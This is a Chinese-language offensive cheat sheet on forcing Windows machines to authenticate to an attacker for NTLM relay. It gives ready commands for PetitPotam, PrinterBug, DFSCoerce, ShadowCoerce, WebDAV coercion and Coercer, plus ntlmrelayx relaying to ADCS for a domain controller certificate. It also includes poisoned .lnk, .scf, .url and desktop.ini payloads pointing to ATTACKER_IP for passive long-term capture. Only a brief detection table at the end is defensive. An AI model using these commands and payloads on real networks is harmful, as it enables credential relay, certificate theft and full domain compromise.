# 强制认证方法详解

强制认证（Authentication Coercion）是 NTLM Relay 攻击链的触发器——迫使目标机器向攻击者发起 NTLM 认证，无需用户交互。

---

## 1. PetitPotam (MS-EFSR)

### 原理

利用加密文件系统远程协议（Encrypting File System Remote Protocol）中的 `EfsRpcOpenFileRaw` 等函数，迫使目标机器向指定 UNC 路径发起 NTLM 认证。

### 无凭据模式

未修补环境（KB5005413 之前）可匿名触发：

```bash
# 无需凭据
python3 PetitPotam.py ATTACKER_IP TARGET_IP
```

### 有凭据模式

修补后仍可使用有效域凭据触发：

```bash
python3 PetitPotam.py -u 'USER' -p 'PASS' -d DOMAIN ATTACKER_IP TARGET_IP
```

### 验证是否可利用

```bash
netexec smb TARGET_IP -u USER -p PASS -M petitpotam
```

### 典型组合

- PetitPotam + ADCS ESC8 = 域控证书 → DCSync
- PetitPotam + LDAP Relay = RBCD / Shadow Credentials

---

## 2. PrinterBug / SpoolSample (MS-RPRN)

### 原理

利用 Print Spooler 服务的 `RpcRemoteFindFirstPrinterChangeNotificationEx` 函数，强制目标机器向攻击者发起认证回调。需要目标运行 Print Spooler 服务。

### 前置检查

```bash
# 检查 Spooler 服务是否启用
rpcdump.py DOMAIN/USER:PASS@TARGET_IP | grep MS-RPRN
```

### 触发

```bash
# printerbug.py (Linux)
python3 printerbug.py DOMAIN/USER:PASS@TARGET_IP ATTACKER_IP

# dementor.py (替代工具)
python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET_IP

# SpoolSample.exe (Windows)
SpoolSample.exe TARGET_IP ATTACKER_IP
```

### 注意事项

- 必须有有效域凭据
- 目标必须运行 Print Spooler 服务（DC 默认开启）
- 微软不认为这是漏洞（by design）

---

## 3. DFSCoerce (MS-DFSNM)

### 原理

利用分布式文件系统命名空间管理协议（MS-DFSNM）中的 `NetrDfsRemoveStdRoot` 等函数触发认证。

### 用法

```bash
python3 dfscoerce.py -u 'USER' -p 'PASS' -d DOMAIN ATTACKER_IP TARGET_IP
```

### 要求

- 有效域凭据
- 目标运行 DFS 服务

---

## 4. ShadowCoerce (MS-FSRVP)

### 原理

利用文件服务器 VSS 代理服务（File Server VSS Agent Service）的 `IsPathSupported` / `IsPathShadowCopied` 函数触发认证。

### 用法

```bash
python3 shadowcoerce.py -u 'USER' -p 'PASS' -d DOMAIN ATTACKER_IP TARGET_IP
```

### 要求

- 有效域凭据
- 目标运行 File Server VSS Agent Service（文件服务器角色）

---

## 5. WebDAV 强制认证

### 原理

通过 WebDAV (WebClient 服务) 触发 HTTP 认证请求。由于 HTTP 无签名要求，可直接中继到 LDAP/ADCS 等目标，绕过 SMB 签名限制。

### WebClient 服务检测

```bash
# 远程检查 WebClient 是否运行
netexec smb TARGET_IP -u USER -p PASS -M webdav

# 通过 RPC 检测
rpcdump.py DOMAIN/USER:PASS@TARGET_IP | grep -i webclient
```

### HTTP 认证降级

当通过 WebDAV 路径（`\\host@80\share`）触发时，认证通过 HTTP 发送而非 SMB，天然没有签名保护：

```bash
# 在目标机器上触发 WebDAV 认证（需要目标上的代码执行能力）
dir \\ATTACKER_IP@80\share

# 或通过 net use
net use \\ATTACKER_IP@80\share

# 攻击机上中继到 ADCS
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp --adcs --template DomainController
```

### 启动 WebClient 服务

如果 WebClient 未运行，可通过搜索连接器技巧启动：

```bash
# 在目标上创建搜索连接器文件 (.searchConnector-ms) 触发 WebClient 启动
```

---

## 6. Coercer 统一工具

Coercer 整合了所有已知强制认证方法，自动尝试多个 RPC 协议。

### 扫描可用方法

```bash
coercer scan -t TARGET_IP -u USER -p PASS -d DOMAIN
```

### 自动尝试所有协议

```bash
coercer coerce -t TARGET_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN
```

### 指定特定方法

```bash
# 仅使用 MS-EFSR
coercer coerce -t TARGET_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN \
  --filter-method-name "MS-EFSR"

# 仅使用 MS-DFSNM
coercer coerce -t TARGET_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN \
  --filter-method-name DfsCoerce
```

### 支持的协议

| 协议 | 对应工具 | 接口 |
|------|----------|------|
| MS-EFSR | PetitPotam | lsarpc / efsrpc |
| MS-RPRN | PrinterBug | spoolss |
| MS-DFSNM | DFSCoerce | netdfs |
| MS-FSRVP | ShadowCoerce | FssagentRpc |

---

## 7. 文件投毒触发认证

在可写共享目录投放恶意文件，当用户浏览该目录时自动触发 NTLM 认证。

### .lnk 文件投毒 (Slinky)

```bash
# 批量投放到所有可写共享
netexec smb TARGET -u 'USER' -p 'PASS' -d 'DOMAIN' \
  -M slinky -o NAME=.thumbs.db SERVER=ATTACKER_IP

# 清理
netexec smb TARGET -u 'USER' -p 'PASS' -d 'DOMAIN' \
  -M slinky -o NAME=.thumbs.db SERVER=ATTACKER_IP CLEANUP=true
```

### .scf 文件投毒 (Scuffy)

```bash
netexec smb TARGET -u 'USER' -p 'PASS' -d 'DOMAIN' \
  -M scuffy -o NAME=.thumbs.scf SERVER=ATTACKER_IP
```

### .url / desktop.ini 手工构造

```ini
# malicious.url
[InternetShortcut]
URL=file://ATTACKER_IP/share
IconIndex=0
IconFile=\\ATTACKER_IP\share\icon.ico
```

```ini
# desktop.ini（放到共享目录）
[.ShellClassInfo]
IconResource=\\ATTACKER_IP\share\icon.ico,0
```

### 特点

- 被动触发，用户浏览目录即中招
- 不需要用户打开文件
- 适合长期潜伏场景

---

## 各方法对比表

| 方法 | 需要凭据 | 匿名可用 | 依赖服务 | 补丁状态 | 可靠性 |
|------|----------|----------|----------|----------|--------|
| PetitPotam (无凭据) | 否 | 是 | EFS | 已修补 (KB5005413) | 低（多数已修补） |
| PetitPotam (有凭据) | 是 | 否 | EFS | 部分修补 | 高 |
| PrinterBug | 是 | 否 | Print Spooler | 未修补 | 高（DC 默认开启） |
| DFSCoerce | 是 | 否 | DFS Namespace | 未修补 | 中 |
| ShadowCoerce | 是 | 否 | VSS Agent | 未修补 | 中（需文件服务器） |
| WebDAV 强制 | 视情况 | 否 | WebClient | N/A | 中（需服务运行） |
| Coercer (全协议) | 是 | 否 | 多种 | N/A | 高（自动枚举） |
| 文件投毒 (.lnk/.scf) | 是 | 否 | 可写共享 | N/A | 中（依赖用户浏览） |

---

## 检测指标

| 方法 | Event ID | 检测点 |
|------|----------|--------|
| PetitPotam | 4624 | 来自非预期源的网络登录 |
| PrinterBug | 4624 | Print Spooler 发起的登录 |
| 文件投毒 | 5145 | 共享目录中新增可疑文件 |
| 所有方法 | 5145 | 向攻击者 IP 的共享访问 |
